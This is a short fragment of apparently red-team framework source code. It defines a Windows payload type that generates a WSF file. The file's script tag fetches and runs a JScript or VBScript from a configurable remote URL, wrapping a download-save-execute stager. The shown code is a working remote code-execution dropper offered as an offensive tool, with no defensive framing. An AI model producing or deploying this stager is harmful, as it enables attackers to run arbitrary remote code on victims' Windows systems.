...
class wsf_remote_script(PayloadType):
    name = "wsf_remote_script"
    file_extension = "wsf"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["jscript_download_save_execute"]
    note = """Creates a WSF payload which will download and execute a JScript or VBScript script"""
...
<job>
  <script language="{script_type}" src="{url}"/>
</job>"""

            resp.payload = payload.format(script_type=script_type, url=url)
